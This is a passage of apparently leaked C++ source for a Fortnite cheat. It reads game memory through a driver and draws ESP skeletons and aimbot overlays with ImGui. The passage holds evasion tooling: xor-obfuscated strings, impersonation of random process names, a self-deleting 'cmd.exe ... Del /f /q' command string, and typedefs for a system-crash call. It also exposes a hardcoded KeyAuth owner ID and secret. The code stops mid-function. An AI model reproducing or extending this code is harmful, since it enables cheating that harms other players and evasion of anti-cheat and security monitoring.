

//// Leaked by proaids XD





#include "win_utils.h"
#include "d3d9_x.h"
#include <dwmapi.h>
#include <vector>
#include "keybind.h"
#include "driver.h"
#include "Controller.h"
#include "include/includes.h"
#include "xor/xor.h"
#include "xor/xorstr.hpp"
#include "lazy.h"
#include "printa.h"
#include "offsets.h"
#include "icons.h"
#include "font.h"
#include "keyauth/auth.hpp"
//#include "hook.hpp"
//#include "overlay.h"

#pragma comment(lib, "psapi.lib")

using namespace KeyAuth;

namespace actor
{
	enum Actor : uint64_t
	{
		RootComponent = 0x188,
		CustomTimeDilation = 0x64,
	};
}

const MARGINS Margin = { -1 };
void render();
int get_fn_processid();

std::string name = _xor_("FortniteCheat").c_str();
std::string ownerid = _xor_("pcfEnafNGp").c_str();
std::string secret = _xor_("a22087d6f85a119a7df2a13cf5f4423921a19585c8442c31038a4b0ca37318a5").c_str();
std::string version = _xor_("1.0").c_str();
std::string url = _xor_("https://keyauth.win/api/1.1/").c_str();
std::string sslPin = _xor_("ssl pin key (optional)").c_str();

api KeyAuthApp(name, ownerid, secret, version, url, sslPin);

#define _CRT_SECURE_NO_WARNINGS_GLOBALS
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

#define Creation_Mitigation_Policy { 0x00000001ui64 << 44 }

typedef NTSTATUS(WINAPI* lpQueryInfo)(HANDLE, LONG, PVOID, ULONG, PULONG);


bool ShowMenu = true;
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "%s"")


DWORD maintabshread(LPVOID in)
{
	while (1)
	{
		if (GetAsyncKeyState(VK_INSERT) & 1) {
			ShowMenu = !ShowMenu;
		}
		Sleep(2);
	}
}

static std::string RandomProcess()
{
	std::vector<std::string> Process
	{
		_xor_("Taskmgr.exe").c_str(),
		_xor_("Discord.exe").c_str()
	};
	std::random_device RandGenProc;
	std::mt19937 engine(RandGenProc());
	std::uniform_int_distribution<int> choose(0, Process.size() - 1);
	std::string RandProc = Process[choose(engine)];
	return RandProc;
}

bool isaimbotting;

struct { //color configs
	float Black[3];
	float RGBRed[3] = { 1.0f, 0.0f, 0.0f };
	float RGBYelllow[3] = { 1.0f, 1.0f, 0.0f };
	float RGBGreen[3] = { 0.0f, 1.0f, 0.0f };
	float RGBBlue[3] = { 0.0f, 0.0f, 1.0f };
	float CMYKRed[3] = { 0.92f, 0.10f, 0.14f };
	float CMYKYellow[3] = { 1.0f, 0.94f, 0.0f };
	float CMYKGreen[3] = { 0.0f, 0.65f, 3.17f };
	float CMYKBlue[3] = { 0.18f, 0.19f, 0.57f };
	float PastelRed[3] = { 255.00f, 0.00f, 119.00f };
	float PastelRedOrange[3] = { 0.97f, 0.67f, 0.50f };
	float PastelYellowOrange[3] = { 0.99f, 0.77f, 0.53f };
	float PastelYellow[3] = { 1.0f, 0.96f, 0.6f };
	float PastelPeaGreen[3] = { 0.76f, 0.87f, 0.60f };
	float PastelYellowGreen[3] = { 0.63f, 0.82f, 0.61f };
	float PastelGreen[3] = { 0.50f, 0.79f, 0.61f };
	float PastelGreenCyan[3] = { 0.47f, 0.8f, 0.78f };
	float PastelCyan[3] = { 0.42f, 0.81f, 0.96f };
	float PastelCyanBlue[3] = { 0.49f, 0.65f, 0.85f };
	float PastelBlue[3] = { 0.51f, 0.57f, 0.79f };
	float PastelBlueViolet[3] = { 0.52f, 0.50f, 0.74f };
	float PastelViolet[3] = { 0.63f, 0.52f, 0.74f };
	float PastelVioletMagenta[3] = { 0.74f, 0.54f, 0.74f };
	float PastelMagenta[3] = { 0.95f, 0.60f, 0.75f };
	float PastelMagentaRed[3] = { 0.96f, 0.59f, 0.61f };
	float LightRed[3] = { 0.94f, 0.42f, 0.30f };
	float LightRedOrange[3] = { 0.96f, 0.55f, 0.33f };
	float LightYellowOrange[3] = { 0.98f, 0.68f, 0.36f };
	float LightYellow[3] = { 1.0f, 0.96f, 0.40f };
	float LightPeaGreen[3] = { 0.67f, 0.82f, 0.45f };
	float LightYellowGreen[3] = { 0.48f, 0.77f, 0.46f };
	float LightGreen[3] = { 0.23f, 0.72f, 0.47f };
	float LightGreenCyan[3] = { 0.10f, 0.73f, 0.70f };
	float LightCyan[3] = { 0.0f, 0.74f, 0.95f };
	float LightCyanBlue[3] = { 0.26f, 0.54f, 0.79f };
	float LightBlue[3] = { 0.33f, 0.45f, 0.72f };
	float LightBlueViolet[3] = { 0.37f, 0.36f, 0.65f };
	float LightViolet[3] = { 0.52f, 0.37f, 0.65f };
	float LightVioletMagenta[3] = { 0.65f, 0.39f, 0.65f };
	float LightMagenta[3] = { 0.94f, 0.43f, 0.66f };
	float LightMagentaRed[3] = { 0.94f, 0.42f, 0.49f };
	float Red[3] = { 0.92f, 0.10f, 0.14f };
	float RedOrange[3] = { 0.94f, 0.39f, 0.13f };
	float YellowOrange[3] = { 0.96f, 0.58f, 0.11f };
	float Yellow[3] = { 1.0f, 0.94f, 0.0f };
	float PeaGreen[3] = { 0.55f, 0.77f, 0.24f };
	float YellowGreen[3] = { 0.22f, 0.70f, 0.29f };
	float Green[3] = { 0.0f, 0.65f, 0.31f };
	float GreenCyan[3] = { 0.0f, 0.66f, 0.61f };
	float Cyan[3] = { 0.0f, 0.68f, 0.93f };
	float CyanBlue[3] = { 0.0f, 0.44f, 0.34f };
	float Blue[3] = { 0.0f, 0.32f, 0.65f };
	float BlueViolet[3] = { 0.19f, 0.19f, 0.57f };
	float Violet[3] = { 0.18f, 0.19f, 0.57f };
	float VioletMagenta[3] = { 0.57f, 0.15f, 5.63f };
	float Magenta[3] = { 0.92f, 0.0f, 0.54f };
	float MagentaRed[3] = { 0.92f, 0.07f, 0.35f };
	float DarkRed[3] = { 0.61f, 0.04f, 0.05f };
	float DarkROrange[3] = { 0.62f, 0.25f, 0.05f };
	float DarkYellowOrange[3] = { 0.53f, 0.38f, 0.03f };
	float DarkYellow[3] = { 0.67f, 0.62f, 0.0f };
	float DarkPeaGreen[3] = { 0.34f, 0.52f, 0.15f };
	float DarkYellowGreen[3] = { 0.09f, 0.48f, 0.18f };
	float DarkGreen[3] = { 0.0f, 0.44f, 0.21f };
	float DarkGreenCyan[3] = { 0.0f, 0.45f, 0.41f };
	float DarkCyan[3] = { 0.0f, 0.46f, 0.63f };
	float DarkCyanBlue[3] = { 0.0f, 0.29f, 0.50f };

	float DarkBlueViolet[3] = { 0.10f, 0.07f, 0.39f };
	float DarkViolet[3] = { 0.26f, 0.05f, 0.38f };
	float DarkVioletMagenta[3] = { 0.38f, 0.01f, 0.37f };
	float DarkMagenta[3] = { 0.61f, 0.0f, 0.36f };
	float DarkMagentaRed[3] = { 0.61f, 0.0f, 0.22f };
	float DarkerRed[3] = { 0.47f, 0.0f, 0.0f };
	float DarkerROrange[3] = { 0.48f, 0.18f, 0.0f };
	float DarkerYellowOrange[3] = { 0.49f, 0.28f, 0.0f };
	float DarkerYellow[3] = { 0.50f, 0.48f, 0.0f };
	float DarkerPeaGreen[3] = { 0.25f, 0.4f, 0.09f };
	float DarkerYellowGreen[3] = { 0.0f, 0.36f, 0.12f };
	float DarkerGreen[3] = { 0.0f, 0.34f, 0.14f };
	float DarkerGreenCyan[3] = { 0.0f, 0.34f, 0.32f };
	float DarkerCyan[3] = { 0.0f, 0.35f, 0.49f };
	float DarkerCyanBlue[3] = { 0.0f, 0.21f, 0.38f };
	float DarkerBlue[3] = { 0.0f, 0.12f, 0.34f };
	float DarkerBlueViolet[3] = { 0.05f, 0.0f, 0.29f };
	float DarkerViolet[3] = { 0.19f, 0.0f, 0.29f };
	float DarkerVioletMagenta[3] = { 0.29f, 0.0f, 0.28f };
	float DarkerMagenta[3] = { 0.48f, 0.0f, 0.27f };
	float DarkerMagentaRed[3] = { 0.47f, 0.27f, 0.14f };
	float PaleCoolBrown[3] = { 0.78f, 0.69f, 0.61f };
	float LightCoolBrown[3] = { 0.6f, 0.52f, 0.45f };
	float MiumCoolBrown[3] = { 0.45f, 0.38f, 0.34f };
	float DarkCoolBrown[3] = { 0.32f, 0.27f, 0.25f };
	float DarkerCoolBrown[3] = { 0.21f, 0.18f, 0.17f };
	float PaleWarmBrown[3] = { 0.77f, 0.61f, 0.43f };
	float LightWarmBrown[3] = { 0.65f, 0.48f, 0.32f };
	float MiumWarmBrown[3] = { 0.54f, 0.38f, 0.22f };
	float DarkWarmBrown[3] = { 0.45f, 0.29f, 0.14f };
	float DarkerWarmBrown[3] = { 0.37f, 0.22f, 0.07f };
	float purple[3] = { 144.00f, 0.00f, 255.00f };
	float white[3] = { 255.00f, 255.00f, 255.00f };
	float Sexycyan[3] = { 0.00f, 229.00f, 250.00f };
	float DarkestRed[3] = { 84.00f, 6.00f, 00.00f };
}color;

namespace Settings {
	// item set ==============================================================

	//Extras (dont work)
	bool EnableHack = true;
	bool StickySilent = false;
	bool Spinbot = false;
	bool Lootesp = false;
	bool ChestESP = false;
	bool traps = false;
	bool RiftEsp = false;
	bool supplydrop = false;
	bool projectile = false;
	bool VehicleEsp = false;
	bool playersweapon = false;
	bool Ultracommon = false;
	bool Common = false;
	bool Uncommon = false;
	bool SkipKnocked = false;
	bool Rare = false;
	bool Legendary = false;
	bool Nospread;
	bool Nobloom;
	bool PlayerReload;
	bool FirstCamera;
	bool InstantRevive;
	bool MagicBullets;
	bool boattp;
	bool RapidFire;
	bool VehicleFly;
	bool g_carfly = false;


	//working shit
	float Active_Tab;
	float Aimbot_Page;
	float Color_Page = 1;
	float Switch_Page;
	float aimkey;
	float hitbox;
	float aimkeypos;
	float hitboxpos = 2;
	float boneswitch = 2;
	float Aim_Speed = 5.0;
	float VisDist = 150;
	float AimFOV = 150.0f;
	int opacity = 1;
	float Thick = 1;
	bool Show_Menu = true;
	bool AimBone = false;
	bool Auto_Bone_Switch = false;
	bool Draw_FOV_Circle = false;
	bool Aim_Prediction = false;
	bool Cross_Hair = true;
	bool bbc = true;
	bool ADSinAir = false;
	bool g_fovchanger;
	bool FOVChangerValue =90;
	bool Lock_Line = false;
	bool outlineesp = false;
	bool Auto_Fire = false;
	bool Radar;
	bool SwingBot = false;
	bool ThreeDBox = false;
	bool lobbyesp = false;
	bool offsets = true;
	bool Head = false;
	bool Neck = false;
	bool Chest = false;
	bool AimWhileJumping = false;
	bool Aimbot = false;
	bool Esp_box = false;
	bool CarFly = false;
	bool AirStuck;
	int AirstuckKey;
	bool shield_esp = false;
	bool npcbotcheck = false;
	bool FOVChanger = false;
	float FOVChangerValueZ = 0;
	float FOVChangerValueY = 0;
	float FOVChangerValueX = 0;
	float InstantReviveValue;
	bool Esp_box_lol = false;
	bool Esp_Corner_Box = false;
	bool Esp_box_fill = false;
	bool Esp_Circle = false;
	bool Esp_Circle_Fill;
	bool Triangle_ESP = false;
	bool Triangle_ESP_Filled;
	bool Head_dot = false;
	bool Distance_Esp = false;
	bool Esp_line;
	bool skeleton = false;
	bool cross_hair = false;
	bool saveconfig = false;
	bool loadconfig = false;
	bool g_doublepump = false;
	bool FirstPerson = false;
	bool g_playerfly = false;
	bool g_instarev = false;

	bool Controller = false;
	bool PlayerESP = false;
	bool name = false;
	bool RadarESP = false;
	bool Watermark = true;
	bool VisableCheck = true;
	bool Airstuck = false;
	bool fly = false;
	bool SelfEsp = false;
	bool dad = false;
	bool dadd = false;
	bool daddd = false;
	bool Ires = false;
	bool XBOX = false;
	bool dadddd = false;
	bool daddddd = false;
	bool dadddddd = false;
	bool daddddddd = false;
	bool Corner_box_fill = false;
	bool Distance = false;
	bool NoWeaponAnim = false;
	bool fnesp = false;
	// FOV Combo //


	namespace MajorValues {
		DWORD_PTR VehicleState = 0x2158; //0x1EA8 //0x1ee0

		DWORD_PTR LocalWeapon;
		DWORD_PTR LocalPlayer = 0x38, LocalPawn = 0x310, LocalPawnRootComponent = 0x188, actorcount = 0xa0, aactors = 0x98, Uworld = 0xcbf38b8, Gameinstance = 0x1A8, LocalPlayers = 0x38, Localplayer = 0x38, PlayerController = 0x30, PlayerState = 0x290, Rootcomp = 0x188, Persistentlevel = 0x30, Ulevel = 0x160;
		Vector3 RelativeLocation;
		int LocalPlayerID = 0, CorrectbSpotted = 0;
		bool showmenu = true;
		int enemyID = 0;
		bool Targeting;
		Vector3 selection;
		Vector3 localactorpos;
		Vector3 LocalPlayerRelativeLocation = Vector3(0.0f, 0.0f, 0.0f);
		float ClosestActorDistance = FLT_MAX;
		int Width, Height, Depth;
		DWORD ScreenCenterX, ScreenCenterY, ScreenCenterZ;
		Vector3 ClosestActorMouseAimbotPosition = Vector3(0.0f, 0.0f, 0.0f);

	}
	static const char* FOV_Combo[] =
	{
		"Circle",
		"Square",
	};
	int FOVMode = 0;
	static const char* HitBox_Combo[] =
	{
		"Head",
		"Body",
		"Pelvis",
	};
	int HitBoxMode = 0;
	static const char* BoxStyle_Combo[] =
	{
		"Default Box",
		"Fill Box",
		"Corner Box",
	};
	int BoxStyleMode;
	bool Box_Bool = false;
	//
	float LineCol[3] = { 1.0f , 0.0f , 0.0f };
	float CornerCOL[3] = { 1.0f , 0.0f , 0.0f };
	float DrawCrossh[3] = { 1.0f , 0.0f , 0.0f };
	float DrawFOVCircle[3] = { 1.0f , 0.0f , 0.0f };
	float Espbox[3] = { color.white[0], color.white[1], color.white[2] };
	float Skeletonchik[3] = { color.white[0], color.white[1], color.white[2] };
	float SkeletonColor[3] = { color.white[0], color.white[1], color.white[2] };
	float BoxCornerESP[3] = { 1.0f , 0.0f , 0.0f };
	float Espboxfill[3] = { color.white[0], color.white[1], color.white[2] };
	float EspCircle[3] = { color.white[0], color.white[1], color.white[2] };
	float EspCircleFill[3] = { color.white[0], color.white[1], color.white[2] };
	float TriangleESP[3] = { color.white[0], color.white[1], color.white[2] };
	float TriangleESPFilled[3] = { color.white[0], color.white[1], color.white[2] };
	float LineESP[3] = { color.white[0], color.white[1], color.white[2] };
	float CrossHair[3] = { color.white[0], color.white[1], color.white[2] };
	float LockLine[3] = { color.white[0], color.white[1], color.white[2] };
	float SkeletonESP[3] = { 1.0f , 0.0f , 0.0f };
	float HeadDotCol[3] = { 1.0f , 0.0f , 0.0f };
	float NotVis[3] = { 1.0f , 0.0f , 0.0f };
	float Thickness = 1.8f;
	float Shape = 50.0f;
	float WorldDIST = 150;
	float Transparency = 1.0f;
	float Transparencyy = 1.0f;
	bool Team_Aimbot;
	bool Team_Esp_box;
	bool Team_Esp_Corner_Box;
	bool Team_Esp_box_fill;
	bool Team_Esp_Circle;
	bool Team_Esp_Circle_Fill;
	bool Team_Triangle_ESP;
	bool Team_Triangle_ESP_Filled;
	bool Team_Head_dot;
	bool Team_Distance_Esp = false;
	bool Team_Esp_line;
	float TeamEspbox[3] = { color.Red[0], color.Red[1], color.Red[2] };
	float TeamBoxCornerESP[3] = { color.LightGreen[0], color.LightGreen[1], color.LightGreen[2] };
	float TeamEspboxfill[3] = { color.RGBRed[0], color.RGBRed[1], color.RGBRed[2] };
	float TeamEspCircle[3] = { color.RGBBlue[0], color.RGBBlue[1], color.RGBBlue[2] };
	float TeamEspCircleFill[3] = { color.RGBRed[0], color.RGBRed[1], color.RGBRed[2] };
	float TeamTriangleESP[3] = { color.RGBBlue[0], color.RGBBlue[1], color.RGBBlue[2] };
	float TeamTriangleESPFilled[3] = { color.RGBRed[0], color.RGBRed[1], color.RGBRed[2] };
	float TeamHeaddot[3] = { color.RGBRed[0], color.RGBRed[1], color.RGBRed[2] };
	float TeamLineESP[3] = { color.LightBlue[0], color.LightBlue[1], color.LightBlue[2] };
	float ESPSkeleton[3] = { 1.0f , 0.0f , 0.0f };
	float squarefov = false;

}
ImFont* m_pFont;

//static int VisDist = 500;
//float AimFOV = 100;



DWORD_PTR Uworld;
DWORD_PTR LocalPawn;
DWORD_PTR PlayerState;
DWORD_PTR Localplayer;
DWORD_PTR Rootcomp;
DWORD_PTR PlayerController;
DWORD_PTR Persistentlevel;
DWORD_PTR LocalPlayerPawn;

Vector3 localactorpos;

uint64_t TargetPawn;
int localplayerID;

RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;

DWORD ScreenCenterX;
DWORD ScreenCenterY;

static void xCreateWindow();
static void xInitD3d();
static void xMainLoop();
static void xShutdown();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;

DWORD Menuthread(LPVOID in)
{
	while (1)
	{
		if (GetAsyncKeyState(VK_INSERT) & 1) {
			ShowMenu = !ShowMenu;
		}
		Sleep(2);
	}
}

FTransform GetBoneIndex(DWORD_PTR mesh, int index)
{
	DWORD_PTR BoneArray;
	BoneArray = read<DWORD_PTR>(mesh + OFFSETS::BoneArray);

	if (BoneArray == NULL)
	{
		BoneArray = read<DWORD_PTR>(mesh + 0x5a0);
	}
	return read<FTransform>(BoneArray + (index * 0x60));
}

Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id)
{
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = read<FTransform>(mesh + OFFSETS::ComponetToWorld);

	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());

	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}

D3DXMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0))
{
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}

struct CamewaDescwipsion
{
	float FieldOfView;
	Vector3 Rotation;
	Vector3 Location;
};

CamewaDescwipsion UndetectedCamera(__int64 a1)
{
	CamewaDescwipsion VirtualCamera;
	__int64 v1;
	__int64 v6;
	__int64 v7;
	__int64 v8;

	v1 = read<__int64>(Localplayer + 0xC8);
	__int64 v9 = read<__int64>(v1 + 8);

	VirtualCamera.FieldOfView = 80.f / (read<double>(v9 + 0x690) / 1.19f);

	VirtualCamera.Rotation.x = read<double>(v9 + 0x7E0);
	VirtualCamera.Rotation.y = read<double>(a1 + 0x148);

	v6 = read<__int64>(Localplayer + 0x70);
	v7 = read<__int64>(v6 + 0x98);
	v8 = read<__int64>(v7 + 0xF8);

	VirtualCamera.Location = read<Vector3>(v8 + 0x20);
	return VirtualCamera;
}

Vector3 ProjectWorldToScreen(Vector3 WorldLocation)
{
	CamewaDescwipsion vCamera = UndetectedCamera(Rootcomp);
	vCamera.Rotation.x = (asin(vCamera.Rotation.x)) * (180.0 / M_PI);

	D3DMATRIX tempMatrix = Matrix(vCamera.Rotation);

	Vector3 vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	Vector3 vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	Vector3 vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	Vector3 vDelta = WorldLocation - vCamera.Location;
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	return Vector3((Width / 2.0f) + vTransformed.x * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, (Height / 2.0f) - vTransformed.y * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, 0);
}

void DrawStrokeText(int x, int y, const char* str)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);

	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x - 1, y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x + 1, y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(255, 255, 255, 255)), utf_8_2.c_str());
}

void DrawSkeleton(DWORD_PTR mesh)
{
	Vector3 vHeadBone = GetBoneWithRotation(mesh, 68);
	Vector3 vHip = GetBoneWithRotation(mesh, 2);
	Vector3 vNeck = GetBoneWithRotation(mesh, 67);
	Vector3 vUpperArmLeft = GetBoneWithRotation(mesh, 9);
	Vector3 vUpperArmRight = GetBoneWithRotation(mesh, 38);
	Vector3 vLeftHand = GetBoneWithRotation(mesh, 10);
	Vector3 vRightHand = GetBoneWithRotation(mesh, 39);
	Vector3 vLeftHand1 = GetBoneWithRotation(mesh, 11);
	Vector3 vRightHand1 = GetBoneWithRotation(mesh, 40);
	Vector3 vRightThigh = GetBoneWithRotation(mesh, 76);
	Vector3 vLeftThigh = GetBoneWithRotation(mesh, 69);
	Vector3 vRightCalf = GetBoneWithRotation(mesh, 77);
	Vector3 vLeftCalf = GetBoneWithRotation(mesh, 70);
	Vector3 vLeftFoot = GetBoneWithRotation(mesh, 73);
	Vector3 vRightFoot = GetBoneWithRotation(mesh, 80);
	Vector3 vHeadBoneOut = ProjectWorldToScreen(vHeadBone);
	Vector3 vHipOut = ProjectWorldToScreen(vHip);
	Vector3 vNeckOut = ProjectWorldToScreen(vNeck);
	Vector3 vUpperArmLeftOut = ProjectWorldToScreen(vUpperArmLeft);
	Vector3 vUpperArmRightOut = ProjectWorldToScreen(vUpperArmRight);
	Vector3 vLeftHandOut = ProjectWorldToScreen(vLeftHand);
	Vector3 vRightHandOut = ProjectWorldToScreen(vRightHand);
	Vector3 vLeftHandOut1 = ProjectWorldToScreen(vLeftHand1);
	Vector3 vRightHandOut1 = ProjectWorldToScreen(vRightHand1);
	Vector3 vRightThighOut = ProjectWorldToScreen(vRightThigh);
	Vector3 vLeftThighOut = ProjectWorldToScreen(vLeftThigh);
	Vector3 vRightCalfOut = ProjectWorldToScreen(vRightCalf);
	Vector3 vLeftCalfOut = ProjectWorldToScreen(vLeftCalf);
	Vector3 vLeftFootOut = ProjectWorldToScreen(vLeftFoot);
	Vector3 vRightFootOut = ProjectWorldToScreen(vRightFoot);

	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vHipOut.x, vHipOut.y), ImVec2(vNeckOut.x, vNeckOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vUpperArmLeftOut.x, vUpperArmLeftOut.y), ImVec2(vNeckOut.x, vNeckOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vUpperArmRightOut.x, vUpperArmRightOut.y), ImVec2(vNeckOut.x, vNeckOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftHandOut.x, vLeftHandOut.y), ImVec2(vUpperArmLeftOut.x, vUpperArmLeftOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightHandOut.x, vRightHandOut.y), ImVec2(vUpperArmRightOut.x, vUpperArmRightOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftHandOut.x, vLeftHandOut.y), ImVec2(vLeftHandOut1.x, vLeftHandOut1.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightHandOut.x, vRightHandOut.y), ImVec2(vRightHandOut1.x, vRightHandOut1.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftThighOut.x, vLeftThighOut.y), ImVec2(vHipOut.x, vHipOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightThighOut.x, vRightThighOut.y), ImVec2(vHipOut.x, vHipOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftCalfOut.x, vLeftCalfOut.y), ImVec2(vLeftThighOut.x, vLeftThighOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightCalfOut.x, vRightCalfOut.y), ImVec2(vRightThighOut.x, vRightThighOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftFootOut.x, vLeftFootOut.y), ImVec2(vLeftCalfOut.x, vLeftCalfOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightFootOut.x, vRightFootOut.y), ImVec2(vRightCalfOut.x, vRightCalfOut.y), ImColor(Settings::SkeletonESP[0], Settings::SkeletonESP[1], Settings::SkeletonESP[2]), 2.0f);
}


float DrawOutlinedText(ImFont* pFont, const std::string& text, const ImVec2& pos, float size, ImU32 color, bool center)
{
	std::stringstream stream(text);
	std::string line;

	float y = 0.0f;
	int i = 0;

	while (std::getline(stream, line))
	{
		ImVec2 textSize = pFont->CalcTextSizeA(size, FLT_MAX, 0.0f, line.c_str());

		if (center)
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x - textSize.x / 2.0f) - 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());

			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2(pos.x - textSize.x / 2.0f, pos.y + textSize.y * i), ImGui::GetColorU32(color), line.c_str());
		}
		else
		{
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) + 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) - 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
			ImGui::GetOverlayDrawList()->AddText(pFont, size, ImVec2((pos.x) + 1, (pos.y + textSize.y * i) - 1), ImGui::GetColorU32(ImVec4(0, 0, 0, 255)), line.c_str());
